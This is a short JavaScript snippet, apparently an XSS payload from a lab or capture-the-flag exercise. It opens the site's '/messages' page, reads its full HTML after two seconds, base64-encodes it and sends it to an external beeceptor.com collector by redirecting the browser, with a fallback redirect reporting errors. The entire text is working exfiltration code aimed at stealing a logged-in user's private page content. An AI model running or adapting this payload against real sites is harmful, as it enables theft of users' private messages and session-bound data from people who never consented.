const a = window.open("/messages");
setTimeout(() => {
  try {
    const content = a.document.documentElement.outerHTML; 
    document.location = 'https://skavens.free.beeceptor.com/ok?'+ btoa(content)
  } catch (err) {
    document.location = 'https://skavens.free.beeceptor.com/error'
    console.error("Impossible d’accéder au contenu :", err);
  }
}, 2000);
